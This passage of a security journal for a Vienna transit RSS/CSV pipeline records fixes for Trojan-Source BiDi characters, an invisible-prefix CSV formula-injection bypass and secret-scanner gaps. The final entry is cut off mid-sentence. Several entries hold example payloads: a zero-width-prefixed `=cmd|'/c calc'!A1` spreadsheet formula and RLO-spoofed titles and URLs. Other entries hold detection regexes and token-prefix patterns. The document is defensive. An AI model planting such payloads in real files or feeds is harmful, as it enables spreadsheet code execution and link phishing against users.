## 2026-05-10 - Trojan-Source RSS via `src/build_feed.py:_CONTROL_RE` Narrower Than the Canonical `_INVISIBLE_DANGEROUS_RE` — BiDi-Mark Drift Round 6 (Feed-XML Writer Sibling)

**Vulnerability:** The 2026-05-10 *CSV Formula-Injection Invisible-Prefix
Bypass* round (Round 5 of the BiDi-Mark Drift family) widened
`src/utils/stats.py:_CSV_CONTROL_CHARS_RE` to mirror the canonical
`src/utils/logging.py:_INVISIBLE_DANGEROUS_RE` set so the four
orthogonal threat classes (C0/C1 controls, BiDi format controls,
zero-width chars, line/paragraph separators) are stripped at the CSV
writer boundary. The closing-checklist for the round explicitly
named the inventory rule "every defence regex sibling that drifts
narrower than the canonical floor must be widened in the same PR" —
but the audit walker stopped at the CSV writer and missed the
**feed-XML writer sibling** in `src/build_feed.py:548-550`:

```python
# Entfernt XML-unerlaubte Kontrollzeichen (außer \t, \n, \r)
_CONTROL_RE = re.compile(
    r"[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]"
)
```

This regex is the **LAST sanitiser** before every feed-item title /
description / time-line lands inside the published RSS XML at
`docs/feed.xml` (served from the project's GitHub Pages origin
`https://origamihase.github.io/wien-oepnv/feed.xml`). It covers ASCII
C0 (ex-TAB/LF/CR) + DEL — narrower than the canonical Trojan-Source /
line-terminator union by **all four threat classes**:

1. **C1 controls** (`\x80-\x9f`) — U+0085 NEL is honoured as a
   record terminator by several SIEM splitters and Markdown
   consumers downstream from the feed; the other C1 controls are
   non-printable and would corrupt operator-facing terminal output.
2. **BiDi format controls** (U+061C ALM, U+202A-U+202E
   LRE/RLE/PDF/LRO/**RLO**, U+2066-U+2069 LRI/RLI/FSI/PDI). The RLO
   primitive is the canonical CVE-2021-42574 *Trojan Source* payload
   in plain-text artefacts.
3. **Zero-width characters** (U+200B-U+200F ZWSP/ZWNJ/ZWJ + LRM/RLM,
   U+FEFF BOM). LRM/RLM are full BiDi primitives despite being
   zero-width.
4. **Unicode line/paragraph separators** (U+2028 LINE SEPARATOR,
   U+2029 PARAGRAPH SEPARATOR). Some Unicode-aware feed readers
   (Feedly mobile, Vivaldi RSS panel) honour these as line breaks,
   splitting one item title into multiple visual lines.

**Threat model (highest-impact path):** A compromised Wiener-Linien
upstream (or MITM / DNS-hijack of the WL endpoints, or a poisoned
`cache/wl/*.json` produced by a different round of supply-chain
compromise) returns an item with a planted invisible-character
payload:

```json
{
  "title": "Linie U6: Wartung – siehe ‮/path/safe.html",
  "description": "Information zur Sperre …"
}
```

The pipeline path:

* `src/build_feed.py:_format_item_content` retrieves
  `raw_title = it.get("title")` and routes it through `_sanitize_text`
  (line 1890).
* `_sanitize_text` returns the input unchanged because
  `_CONTROL_RE.sub("")` does not match U+202E (the regex covers
  `\x00-\x08` + `\x0B-\x0C` + `\x0E-\x1F` + `\x7F` only).
* The result flows into `_WHITESPACE_RE.sub(" ", title_out).strip()`
  which collapses ASCII whitespace runs but does NOT strip BiDi /
  zero-width characters (`"‮".isspace()` is `False`; Python's
  `\s` matches Unicode whitespace category but not BiDi format
  controls).
* The title is wrapped in CDATA via `_cdata_content(title_out)` which
  only escapes `]]>`; BiDi marks pass through verbatim.
* `_emit_item` constructs `ET.SubElement(item, "title").text =
  PH_TITLE` and the placeholder is later substituted with the
  CDATA-wrapped title in the final XML output.
* `ET.tostring(...)` does NOT XML-escape U+202E (it is a valid
  Unicode codepoint, not an XML metacharacter). The bytes land
  verbatim inside `<title>` of `docs/feed.xml`.

The same pipeline applies to `raw_desc` (sanitised at line 1702 via
`html_to_text(...).strip()` → `_sanitize_text`) and to the
`time_line` (line 1903) — three independent feed-output sinks share
the same drift.

Subscribers reading the feed in any Unicode-aware reader (Feedly,
NetNewsWire, Inoreader, Vivaldi RSS, kindle-RSS gateways, `rsstail`,
IDE-embedded readers) see the post-RLO segment reversed in the
rendered item title — a textbook Trojan-Source RSS attack on a
public artefact.

The same bypass shape generalises across the canonical invisible-
character set:

* **U+200E LRM / U+200F RLM** — BiDi inversion in any reader that
  honours BiDi marks. Identical visual confusion to U+202E without
  needing a closing PDF.
* **U+200B ZWSP / U+200C ZWNJ / U+200D ZWJ / U+FEFF BOM** —
  invisible byte insertions create cache-key disagreements (the WL
  provider computes `ident` from a hash of the title; an attacker
  with a fixed ZWSP-injected title and a clean title have different
  hashes, so the dedup logic accepts both). A hostile upstream can
  churn the dedup window indefinitely with visually-identical
  "fresh" items.
* **U+2028 LINE SEPARATOR / U+2029 PARAGRAPH SEPARATOR** — some feed
  readers treat these as line breaks, splitting a single item title
  into multiple visual lines.
* **U+0085 NEL** — same record-terminator shape; honoured as a line
  break by several Markdown / SIEM splitters that consume the feed
  via a downstream pipeline.

**Severity:** HIGH — public artefact (`docs/feed.xml` published to
GitHub Pages), multiple upstream injection paths (every provider
contributes to the title / description), defense-in-depth gap on
the LAST sanitiser before the XML serialiser.

**Fix:** Widen `_CONTROL_RE` from the C0+DEL-only class to the
canonical `_INVISIBLE_DANGEROUS_RE` set plus C1 controls,
mirroring `src/utils/stats.py:_CSV_CONTROL_CHARS_RE`:

```python
_CONTROL_RE = re.compile(
    r"[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F"
    r"؜​-‏ -‮⁦-⁩﻿]"
)
```

The widening is **additive** — every character the pre-fix regex
matched still matches post-fix (verified by
`test_control_re_preserves_existing_coverage`). TAB (`\x09`),
LF (`\x0A`), CR (`\x0D`), and SPACE (`\x20`) remain unmatched (RSS
allows them and the downstream `_WHITESPACE_RE` collapse normalises
them). Unicode escape form keeps Bandit B613 happy.

**Learning:** The 2026-05-10 CSV writer round's prevention rule
named "every defence regex sibling that drifts narrower than the
canonical floor must be widened in the same PR". The audit walker
that round used (`grep -rn '_UNSAFE.*CHARS\|_CONTROL_CHARS' src/
scripts/`) reported six sibling regexes — but the round's *fix*
scoped to only the CSV writer and explicitly deferred two siblings
(the feed-XML writer regex `src/build_feed.py:_CONTROL_RE` and the
sitemap writer regex `scripts/generate_sitemap.py:_UNSAFE_URL_CHARS`)
to a follow-up round. The deferred set turned out to contain the
HIGHEST-impact sibling — the feed-XML writer is on the LAST
sanitiser before the public RSS XML, while the CSV writer feeds an
internal stats dashboard with much lower blast radius.

Same recursive meta-pattern as JSON Size-Bomb Drift Rounds 1-8
(every round closes one structural axis and surfaces the next):
Round 5 of BiDi-Mark Drift closed the CSV writer sibling, Round 6
closes the feed-XML writer sibling — the most-public sink in the
project. The right closure for the BiDi-Mark Drift family is
"every defence regex that strips control bytes from text destined
for a public artefact MUST cover the canonical
`_INVISIBLE_DANGEROUS_RE` set, regardless of the artefact format
(CSV / Markdown / RSS XML / sitemap XML / GitHub Issue body)" —
and the round closes only when the inventory grep returns zero
remaining sites.

The auto-discoverable invariant lives in
`tests/test_sentinel_feed_xml_invisible_prefix.py` extended with
50 tests — 19 per-code-point regex-match tests, 19 per-code-point
write-path tests via `_sanitize_text`, two end-to-end Trojan-
Source PoC tests (RLO + ZWSP), one inventory test that pins the
canonical-set coverage invariant, three regression tests that
preserve the pre-fix C0/DEL coverage, ASCII whitespace
passthrough, and legitimate German title round-trip. The
inventory test mirrors the
`test_csv_control_chars_regex_covers_canonical_invisible_dangerous_set`
shape from Round 5 and the
`test_unsafe_url_chars_regex_covers_canonical_invisible_dangerous_set`
shape from Round 4 — three identical inventory tests now pin the
companion-regex sync rule across three independent sanitiser
boundaries (CSV, URL, RSS XML). Any future widening of the
canonical `_INVISIBLE_DANGEROUS_RE` (e.g. a Unicode 16 BiDi format
control) fails all three tests until each writer's regex is
widened too.

**Prevention:** The deferred-sibling enumeration grep
(`grep -rn '_CONTROL_RE\b\|_CONTROL_CHARS\b\|_UNSAFE_URL_CHARS\b\|_UNSAFE_CHARS_RE\b' src/ scripts/`) MUST be re-run at the end of
every BiDi-Mark Drift round, and the verdict line MUST cite the
*post-fix state* of every sibling — not just the one fixed in this
round. The remaining sibling after Round 6 is
`scripts/generate_sitemap.py:39:_UNSAFE_URL_CHARS` which is narrower
than the canonical `src/utils/http.py:_UNSAFE_URL_CHARS` but is
**redundant** (the second-layer `validate_public_feed_url` already
catches the BiDi/zero-width chars via its own canonical regex).
That sibling is therefore in bucket-(b) "deferred with no-specific-
exploit-shape because the second-layer gate covers it" — it remains
a code-quality / defense-in-depth issue but is not currently a
vulnerability surface. A future PR that adds a callsite of
`_UNSAFE_URL_CHARS` in `scripts/generate_sitemap.py` without the
fall-through to `validate_public_feed_url` would re-open the
exploit shape; the inventory grep above is the closing-checklist
trigger.

---

## 2026-05-10 - CSV Formula-Injection Bypass via Leading Invisible / BiDi / Line-Terminator Characters at the `_sanitize_csv_text_field` Boundary — BiDi-Mark Drift Round 5 (CSV Writer Sibling)

**Vulnerability:** The 2026-05-09 *CSV Formula Injection (CWE-1236) at the
Stats-Writer Boundary* round closed the canonical formula-prefix surface
(`=` / `+` / `-` / `@` / `\t` / `\r`) in
`src/utils/stats.py:_sanitize_csv_text_field` by prepending a single
quote (`'`) to any cell beginning with one of `_CSV_FORMULA_PREFIXES`.
The companion regex `_CSV_CONTROL_CHARS_RE` that strips noise
**before** the prefix check covered only ASCII C0 controls + DEL
(`[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]`) — narrower than the canonical
`src/utils/logging.py:_INVISIBLE_DANGEROUS_RE` set the BiDi-Mark Drift
family (Rounds 2-4) consolidated as the project-wide invisible /
Trojan-Source / line-terminator floor.

The drift opened a **formula-injection bypass** because:

1. `_CSV_CONTROL_CHARS_RE.sub("", value)` does NOT strip
   ZWSP / RLO / BOM / ALM / LRM / line-separator / NEL.
2. `str.strip()` does NOT consider these whitespace
   (`"​".isspace() is False`); they survive the strip step.
3. `cleaned.startswith(_CSV_FORMULA_PREFIXES)` inspects the still-
   leading invisible character (NOT the residual `=`); the check
   returns `False` and the apostrophe-defang is **never applied**.

A planted upstream payload such as `"​=cmd|'/c calc'!A1"` lands
verbatim in `data/stats/stoerungen_<YYYY>.csv`. The ledger is
committed to the repository by the `generate-stats.yml` workflow; it
is therefore a **public artefact**.

**Threat model (highest-impact path):** A compromised Wiener-Linien
upstream (or MITM / DNS-hijack of the WL endpoints, or a poisoned
`cache/wl/*.json` produced by a different round of supply-chain
compromise) returns a description with a planted invisible-prefixed
formula payload:

```json
{
  "title": "U6: Verspätung",
  "description": "… | Haltestelle: ​=cmd|'/c calc'!A1 "
}
```

The pipeline path:

* `extract_location_name` (`src/utils/stats.py:432`) matches the
  `\| Haltestelle:` regex, splits on `,`, strips ASCII whitespace
  (which leaves the leading ZWSP intact — ZWSP is U+200B and
  `str.split` / `str.strip` operate on the Unicode `White_Space=yes`
  category, which excludes ZWSP/ZWNJ/ZWJ/BOM). For an unknown
  Haltestelle (the regex's curated-upstream branch, see the function
  docstring) the return is the raw 80-char-clamped string —
  `​=cmd|'/c calc'!A1`.
* `src/build_feed.py:_update_item_state` calls
  `append_disruption_row(provider="ÖBB", location_name="​=cmd…")`
  on the strictly-new identity branch (`is_strictly_new` gate).
* `_sanitize_csv_text_field` runs the four-step pipeline; the
  `_CSV_CONTROL_CHARS_RE.sub("")` step does not match ZWSP, the
  `.strip()` step does not strip ZWSP, and the
  `.startswith(_CSV_FORMULA_PREFIXES)` step returns `False` because
  the leading byte is U+200B, not `=`. The apostrophe-defang is
  skipped.
* The CSV writer commits the row `…,​=cmd|'/c calc'!A1` into
  `data/stats/stoerungen_2026.csv`. The cron pipeline pushes the
  file to GitHub on the next `generate-stats.yml` tick.

The CSV is now a public artefact carrying a disguised CWE-1236
payload. An operator opening the file in Excel / LibreOffice Calc /
Google Sheets to inspect indicators of compromise sees `=cmd|'/c
calc'!A1` rendered as a cell whose visual content begins with `=`
(the leading invisible prefix is collapsed by the spreadsheet's
text renderer). Several spreadsheet engines and locale-specific
configurations evaluate the residual content as a formula —
**CWE-1236 RCE in the operator's spreadsheet**, originally landed
via a compromised-upstream chain of trust.

The same bypass shape generalises across the full canonical
invisible set: U+202E (RLO) lands a *Trojan-Source CSV* (the cell
content is visually reversed in the rendering, hiding the formula
from a reviewing analyst); U+FEFF (BOM) lands a *byte-equality
disagreement* (`len("﻿=cmd") == 4` but visually identical to
`"=cmd"` in any consumer that collapses the BOM); U+0085 (NEL) is
*record terminator* in some CSV / SIEM splitters that breaks a
single cell into multiple rows downstream — same exfiltration shape
as an embedded newline.

**Fix:** Widen `_CSV_CONTROL_CHARS_RE` from the C0+DEL-only class
to the canonical `_INVISIBLE_DANGEROUS_RE` set plus C1 controls,
mirroring `src/utils/text.py:_MARKDOWN_NORMALISE_UNSAFE_RE`:

```python
_CSV_CONTROL_CHARS_RE: Final = re.compile(
    r"[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F"
    r"؜​-‏ -‮⁦-⁩﻿]"
)
```

The widening is **additive** — every character the pre-fix regex
matched still matches post-fix (verified by
`test_csv_control_chars_regex_preserves_existing_coverage`). TAB
(`\x09`), LF (`\x0A`), CR (`\x0D`), and SPACE (`\x20`) remain
**unmatched** so legitimate cell content survives (verified by
`test_csv_control_chars_regex_does_not_match_readable_whitespace`).
The Unicode escape-sequence form is required because Bandit's B613
Trojan-Source plugin flags any `src/` file containing literal BiDi
format controls — `؜` / `​-‏` / `‪-‮` /
`⁦-⁩` / `﻿` are stored as escapes, not literals, so
the file passes B613 while the regex still matches the runtime
characters. (Documentation comments adjacent to the regex were
edited in the same commit to replace the two literal BiDi
references with `<U+200B>` / `<U+202E>` placeholders for the same
reason.)

**Test surface (+84 new pytest cases):**
`tests/test_sentinel_csv_formula_injection_invisible_prefix.py`
mirrors the 2026-05-09 BiDi-Mark Drift Round 4 sibling test
`test_sentinel_http_url_chars_bidi_gap.py`:

* **Per-code-point regex match** (19 cases × ALM / ZWSP / ZWNJ /
  ZWJ / LRM / RLM / LINE SEP / PARA SEP / LRE / RLE / PDF / LRO /
  RLO / LRI / RLI / FSI / PDI / BOM / NEL):
  `_CSV_CONTROL_CHARS_RE.search(<cp>)` must return a match.
* **Per-code-point write-path PoC** for each of the three
  operator-/upstream-influenced text fields (provider /
  location_name / direction): writing `<cp>=cmd|'/c calc'!A1`
  through the public writer must produce a cell whose content
  does NOT begin with a formula prefix AND does NOT contain the
  invisible code point. (3 fields × 19 code points = 57 cases.)
* **Inventory invariant** (1 case):
  `test_csv_control_chars_regex_covers_canonical_invisible_dangerous_set`
  walks the full 0x110000 Unicode code-space, materialises every
  code point matched by `_INVISIBLE_DANGEROUS_RE`, and asserts
  `_CSV_CONTROL_CHARS_RE` matches the same set. Mirrors the Round
  3 / Round 4 inventory tests so the *companion-regex sync rule*
  is now pinned at THREE defence boundaries (stations validation,
  URL validation, CSV write).
* **Coverage-preserving regression** (1 case): every character
  `_CSV_CONTROL_CHARS_RE` matched pre-fix still matches post-fix.
* **Whitespace-passthrough regression** (1 case): TAB / LF / CR /
  SPACE must NOT match (they are required for legitimate cell
  content; embedded newlines are QUOTE_MINIMAL-wrapped by `csv`
  and leading TAB / CR are still in `_CSV_FORMULA_PREFIXES`).
* **Safe-text round-trip regression** (2 cases): legitimate
  German strings `"ÖBB"` / `"Wien Floridsdorf"` /
  `"Floridsdorf"` round-trip byte-exactly.
* **On-disk byte invariant** (1 case): no canonical invisible
  code point survives into the on-disk CSV bytes.
* **End-to-end attack-chain PoC** (1 case): a planted upstream
  description with a ZWSP-prefixed formula payload travels through
  `extract_location_name` → `append_disruption_row` → CSV file;
  the resulting cell does NOT begin with a formula prefix.
* **csv.reader round-trip** (1 case): the defang persists when the
  file is read back via `csv.reader` (so downstream consumers like
  `scripts/generate_markdown_stats.py` see the defanged value).

**Learning:** Two reinforcing lessons:

  (a) **Sibling-regex sync at every defence boundary that sees
      adversarial text — three boundaries down, one canonical
      sanitiser to rule them all.** Round 3 (`stations_validation
      ._UNSAFE_CHARS_RE`) and Round 4 (`http._UNSAFE_URL_CHARS`)
      established the inventory-invariant pattern at the validation
      boundaries; this round (Round 5) extends the pattern to the
      **CSV write boundary**. The closing rule:

      > Any sanitiser that runs `regex.sub("", value)` over text
      > destined for an artefact a human or downstream tool will
      > read MUST cover at least the canonical
      > `_INVISIBLE_DANGEROUS_RE` set. The check is mechanical:
      > programmatic enumeration of every code point matched by
      > the canonical regex, asserted against the local sibling
      > regex.

      The remaining unaudited sanitisers (per a fresh `git grep -nE
      'CONTROL_CHARS|_UNSAFE_CHARS|NORMALISE_UNSAFE|INVISIBLE'`):
      `_BAD_CONTROL_CHARS_RE` (`scripts/configure_feed.py` —
      writer for `.env`/secrets, narrower than canonical),
      `_TITLE_CONTROL_RE` / `_DESCRIPTION_CONTROL_RE` (provider
      modules — caller-facing rendering, intermediate sinks).
      Each will be enumerated in a follow-up round if/when the
      blast radius warrants the closing PR.

  (b) **`str.strip` is not enough for invisible-prefix bypass
      defence.** Three independent code paths in
      `_sanitize_csv_text_field` (pre-fix): `_CSV_CONTROL_CHARS_RE
      .sub`, `.strip()`, `.startswith(_CSV_FORMULA_PREFIXES)`.
      All three operate on a Unicode-aware definition of "this
      character is harmless / handled / a formula prefix" — but
      THE SAME CODE POINT (U+200B et al.) slips through all three:
      not in the regex's character class, not in
      `str.isspace`, not in `_CSV_FORMULA_PREFIXES`. The
      multiplicative effect is a complete bypass of a
      defence-in-depth chain that *looked* like it covered the
      surface. The fix is to align step 1 (the strip-noise regex)
      with the canonical invisible set so step 2 (`.strip`) and
      step 3 (formula-prefix check) operate on the visible content
      only — the same `cleaned` value the spreadsheet renderer
      eventually displays.

**Prevention:** The companion-regex sync rule is now pinned at
THREE inventory tests (`test_unsafe_chars_regex_covers_canonical
_invisible_dangerous_set`, `test_unsafe_url_chars_regex_covers_
canonical_invisible_dangerous_set`,
`test_csv_control_chars_regex_covers_canonical_invisible_dangerous
_set`). Any future widening of `_INVISIBLE_DANGEROUS_RE` (e.g. a
Unicode 16 BiDi format control) fails ALL THREE inventory tests
until ALL THREE boundaries are widened too. The test triad is the
programmatic floor that survives the next contributor who has not
read the journals.

## 2026-05-09 - BiDi-Mark Drift Round 4: `_UNSAFE_URL_CHARS` in `src/utils/http.py` Was the Sibling Regex Round 3's Closing-Checklist Named But Did Not Close

**Vulnerability:** The 2026-05-09 BiDi-Mark Drift Round 3 entry
("Two-Site Drift Closure: OSMOverpassConfig Host-Only Validation +
`_UNSAFE_CHARS_RE` BiDi/Zero-Width Gap") closed the validator regex
in `src/utils/stations_validation.py` and laid down the canonical
**Companion-regex sync rule**:

> Whenever a defence regex grows to cover a new code point, audit
> every sibling regex in the project (`stations_validation.
> _UNSAFE_CHARS_RE`, `_UNSAFE_URL_CHARS` in `http.py`, station-name
> validators in provider modules) and either widen them to match or
> document the divergence with an explicit deferral note.

Round 3 explicitly enumerated `_UNSAFE_URL_CHARS` in `src/utils/http.py`
as a sibling regex by NAME — but its commit closed only the
`stations_validation._UNSAFE_CHARS_RE` site. The URL validator
inherited the pre-fix character class
`[\s\x00-\x1f\x7f<>\"\\^`{|}]` which covers ASCII whitespace
(`\s` — incl. U+2028/U+2029 line/paragraph separators), C0 controls
+ DEL, and the structural URL-injection characters `< > " \ ^ ` { | }`
— but **explicitly does NOT cover** the canonical
`src/utils/logging.py:_INVISIBLE_DANGEROUS_RE` set (16 missing code
points, programmatically enumerated):

  * **U+061C** ARABIC LETTER MARK (ALM, post-Unicode-6.3 BiDi
    control).
  * **U+200B-U+200F** ZWSP / ZWNJ / ZWJ / **LRM** / **RLM** —
    invisible characters that are full BiDi primitives (LRM/RLM)
    OR cause cache-key / equality-check disagreements (ZWSP/ZWNJ/ZWJ).
  * **U+202A-U+202E** LRE / RLE / PDF / LRO / **RLO** — the
    canonical CVE-2021-42574 "Trojan Source" primitives. RLO
    (U+202E) is the highest-impact: it inverts the visual rendering
    of subsequent text in any Unicode-aware feed reader.
  * **U+2066-U+2069** LRI / RLI / FSI / PDI BiDi isolates
    (CVE-2021-42574 second half).
  * **U+FEFF** BYTE ORDER MARK / ZWNBSP — visually invisible,
    causes byte-equality disagreements at downstream consumers.

`validate_http_url` is the canonical URL validator — every URL flowing
into the project routes through it (build_feed.py:1692 for feed-item
links, src/feed/reporting.py:875 for the GitHub-Issue auto-submit API
URL, scripts/generate_sitemap.py via `validate_public_feed_url` for
the sitemap base URL, every `request_safe` / `fetch_content_safe`
outbound HTTP call).

**Threat model (highest-impact path):** A compromised upstream /
DNS-hijack / MITM that returns a feed item with a planted `link`
field carrying RLO (U+202E):

```json
{"title": "U6: Verspätung", "link": "https://safe.example.com‮/path/evil"}
```

The provider stores the item in cache JSON. `_format_item_content`
(`src/build_feed.py:1692`) calls `validate_http_url(link, check_dns=False)`
to gate the link before it lands in the RSS `<link>` element. Pre-fix
the validator returns the URL unchanged — every guard inside
`validate_http_url` (scheme, port, IDNA NFKC, SSRF, userinfo) passes
because the BiDi mark is in the path (not the structural-URL
components). The link lands in `docs/feed.xml` verbatim:

```xml
<link>https://safe.example.com‮/path/evil</link>
```

ElementTree XML serialisation does NOT escape U+202E (it is a valid
Unicode character, not an XML metacharacter). Subscribers reading
the feed in a Unicode-aware reader see the post-RLO segment reversed
in the rendered URL — a textbook **Trojan Source URL phishing
primitive in a public artefact** served from
`https://origamihase.github.io/wien-oepnv/feed.xml`. The user sees
one URL but clicking sends the browser to a different URL.

**Fix:** Widen `_UNSAFE_URL_CHARS` to the canonical
`_INVISIBLE_DANGEROUS_RE` set:

```python
_UNSAFE_URL_CHARS = re.compile(
    r"[\s\x00-\x1f\x7f<>\"\\^`{|}"
    r"؜​-‏‪-‮⁦-⁩﻿]"
)
```

Mirrors the canonical `_INVISIBLE_DANGEROUS_RE` shape pinned in
`src/utils/logging.py:57`. The widening is **additive** — every
character the pre-fix regex matched still matches post-fix
(verified by the regression test
`test_unsafe_url_chars_regex_preserves_existing_coverage`). The Unicode
escape-sequence form is required because Bandit's B613 Trojan-Source
plugin flags any source file containing literal BiDi format controls
— `؜` / `‪-‮` / `﻿` are stored as escapes, not
literals, so the file passes B613 while the regex still matches the
runtime characters.

**Test surface (+52 new pytest cases):**
`tests/test_sentinel_http_url_chars_bidi_gap.py` mirrors the Round 3
`stations_validation` test file shape:
  * **Per-code-point regex match** (16 cases × ALM / ZWSP / ZWNJ /
    ZWJ / LRM / RLM / LRE / RLE / PDF / LRO / RLO / LRI / RLI / FSI
    / PDI / BOM): `_UNSAFE_URL_CHARS.search(<cp>)` must return a
    match.
  * **Per-code-point `validate_http_url` rejection** (16 cases):
    `validate_http_url(f"https://safe.example.com{cp}/path", check_dns=False)`
    must return `None`.
  * **Per-code-point `validate_public_feed_url` rejection** (16
    cases): the public-feed validator must inherit the rejection
    via its `validate_http_url` delegation — pinning the contract
    that fixes at the lower layer transparently propagate to the
    higher layer.
  * **Inventory invariant** (1 case):
    `test_unsafe_url_chars_regex_covers_canonical_invisible_dangerous_set`
    walks the full 0x110000 Unicode code-space, materialises every
    code point matched by `_INVISIBLE_DANGEROUS_RE`, and asserts
    `_UNSAFE_URL_CHARS` matches the same set. A future widening of
    the canonical regex (e.g. a Unicode 16 BiDi format control)
    fails this invariant until `_UNSAFE_URL_CHARS` is widened too.
  * **Coverage-preserving regression** (1 case): every character
    `_UNSAFE_URL_CHARS` matched pre-fix (whitespace / C0 / DEL /
    structural URL-injection) still matches post-fix.
  * **Safe-URL-character regression** (1 case): legitimate URL
    characters (`/?&=#-_.~%+:@[]:`, ASCII letters/digits)
    must NOT match the widened regex.
  * **Clean-URL acceptance** (1 case): `validate_http_url` accepts
    a clean `https://` URL post-fix — sanity that the widening did
    not over-reach.

**Learning:** Two reinforcing lessons:

  (a) **Sibling-regex named-list audit closure.** Round 3's verdict
      *did* enumerate `_UNSAFE_URL_CHARS` as a sibling drift
      candidate — but the round's actual fix scope was scoped to
      `stations_validation._UNSAFE_CHARS_RE` only. Same meta-pattern
      as Round 7 of the env-cap drift family (`LOG_BACKUP_COUNT`
      named in Round 6's prevention rule but deferred until Round 7),
      Round 11 of the `timedelta` family (`FRESH_PUBDATE_WINDOW_MIN`
      named in Round 9/10 but deferred until Round 11), Round 5 of
      the JSON depth-bomb family (16 sites named in Round 4's
      enumeration but only 7 fixed). The closing rule: when an audit
      *names* a sibling site as "needs widening", the next round's
      PR MUST land the widening AT the named site, not just at the
      single site the round is actively touching.

  (b) **Inventory-invariant programmatic pinning.** Round 3
      introduced
      `test_unsafe_chars_regex_covers_canonical_invisible_dangerous_set`
      — an inventory test that walks the full 0x110000 code-space
      and pins the regex sync invariant programmatically. This
      round adds the URL-validator analog
      `test_unsafe_url_chars_regex_covers_canonical_invisible_dangerous_set`.
      Together the two inventory tests pin the
      companion-regex sync rule for both validation boundaries —
      any future Unicode-version bump that adds a new BiDi format
      control fails BOTH tests until BOTH validators are widened.
      The test pair is the programmatic floor that survives the next
      contributor who hasn't read the journals.

**Prevention:** The companion-regex sync rule from Round 3 stands
unchanged. The Round 4 contribution is the inventory-invariant
**pair** programmatically pinning the rule for both the
stations-validator boundary AND the URL-validator boundary. Future
sibling regexes (station-name validators in provider modules per
Round 3's named list, future provider field validators) MUST adopt
the same pattern: a per-validator `test_..._covers_canonical_invisible_
dangerous_set` test at the canonical sanitiser path, run alongside
the Round-N PoC tests, so the sync invariant fails closed as soon as
the canonical regex grows.

## 2026-05-09 - Secret Scanner Drift Round 5: Atlassian / Sentry / Linear Issuer Attribution Gap
**Vulnerability:** `_KNOWN_TOKENS` in `src/utils/secret_scanner.py`
covered fourteen issuer prefixes after the 2026-05-08 Round 4 round
(JWT + Discord), but a fresh audit against the modern Python-project
issuer landscape surfaced three high-impact prefixes whose canonical
tokens were silently flagged by the `_HIGH_ENTROPY_RE` fallback as a
generic `Hochentropischer Token-String` (or by `_SENSITIVE_ASSIGN_RE`
as a generic `Verdächtige Zuweisung`) — losing the specific issuer
attribution that incident-response triage keys off:

  1. **Atlassian Cloud API Tokens** (`ATATT3xFfGF0<base64 body><CRC32>`)
     — Jira / Confluence / Trello Cloud REST-API access tokens issued
     via id.atlassian.com. ~204-char canonical shape (12-char unique
     prefix + ~184-char base64url body + 8-char CRC32 hex suffix). A
     leak grants the issuing user's full Cloud-API scope across every
     accessible workspace.
  2. **Sentry Auth Tokens** (`sntrys_<base64-with-embedded-JSON>`) —
     Sentry's modern rotation-aware auth-token format (since 2023).
     The body encodes embedded JSON metadata (organisation / scope) +
     a trailing checksum. Used for the org-level API
     (`/api/0/organizations/<slug>/...`); a leak grants access to
     every project's issue/event data, releases, debug files, source
     maps, member list, and webhook configuration.
  3. **Linear API Keys** (`lin_api_<32+ alphanumeric>`) — Linear
     (issue tracker / project management) personal API keys issued
     via linear.app/settings/api. A leak grants the user's full
     project-management API scope (read/write all visible issues,
     comments, attachments, projects, team metadata, webhooks).

Each issuer's revocation flow lives at a distinct vendor URL
(id.atlassian.com / sentry.io / linear.app) so generic-only
attribution slows IR (operator chases the wrong rotation playbook).
The PoC in `tests/test_sentinel_secret_scanner_drift_round5.py` plants
each token into a synthetic file under `KEY = "..."` shape and
asserts the issuer-specific reason (`Atlassian API Token gefunden` /
`Sentry Auth Token gefunden` / `Linear API Key gefunden`) appears in
the scan findings; pre-fix every test failed because either the
generic entropy / assignment fallback was the only finding, OR the
prefix interrupted the entropy-alphabet match (the `_` separator
between `lin_api_` and the alphanumeric body keeps the entropy regex
running, but the issuer attribution is lost).

**Learning:** The 2026-05-08 Round-4 prevention rule still holds —
treat `_KNOWN_TOKENS` as an **issuer-keyed table**, not a list. Each
audit round walks the modern Python-project issuer landscape (config
files, infra-as-code, observability stacks, project-management
integrations) and adds every variant whose canonical prefix is
unambiguous and whose body matches the entropy fallback's alphabet
(so the body alone would only ever flag generically). Three classes
of issuers fit that signature post-Round-4:
  * Cloud SaaS API tokens with byte-exact prefixes
    (Atlassian `ATATT3xFfGF0`, Sentry `sntrys_`, Linear `lin_api_`).
  * Multi-segment dot-separated tokens whose dots break the entropy
    alphabet (Round-4 closed JWT + Discord; nothing remaining in
    this class as of Round 5).
  * Strict-format tokens whose body alphabet excludes
    `[A-Za-z0-9+/=_-]` characters (none observed in the modern
    landscape that the entropy fallback would miss completely).

**Prevention:** When adding a new entry to `_KNOWN_TOKENS`, the
checklist is unchanged from Round 4 — pin the issuer-specific reason
in `tests/test_sentinel_secret_scanner_drift_round5.py` (or a
sibling Round-N test file) AND in
`tests/test_sentinel_secret_scanner_drift_round5.py:test_known_tokens_round5_taxonomy`
so a future PR that drops the pattern fails at PR-review time. The
ordering rule still applies: place new entries AFTER more specific
issuer-prefixed tokens so `is_covered` correctly anchors on the most
specific issuer first (e.g. `sntrys_eyJ...` would also match the JWT
detector if Sentry came first; the Sentry pattern is more specific
because the `sntrys_` prefix is unambiguous).

## 2026-05-09 - Markdown Injection Drift Round 3: Eight Bullet-Body Sinks at the `ValidationReport.to_markdown()` Boundary — Stations-Directory Sister of the Feed-Health / Stats-Dashboard Renderer Drifts
**Vulnerability:** The 2026-05-09 Markdown-injection rounds closed the
renderer boundary in `scripts/generate_markdown_stats.py` (stats
dashboard) and `src/feed/reporting.py` (Feed-Health report + GitHub
Issue body) but their threat-model paragraph on "Markdown rendering is
the LAST sink in any text-data pipeline that ends in a human-readable
artefact (dashboard, **issue body**, **README**); always treat it as
a *defence boundary* even when an upstream sanitiser exists" *implicitly*
opened a sibling drift round: the third Markdown-emitting renderer in
the project — `ValidationReport.to_markdown()` in
`src/utils/stations_validation.py` — interpolated up to fifteen
operator-controlled string fields (across eight issue-category
sections) directly into Markdown bullet bodies *without any
escaping at all*.

The renderer is consumed by the CLI subcommand
``python -m src.cli stations validate --output
docs/stations_validation_report.md`` (driven by
``.github/workflows/update-stations.yml`` on a monthly cron and
``.github/workflows/manual-full-refresh.yml`` on workflow_dispatch).
Both workflows then auto-commit the rendered Markdown via
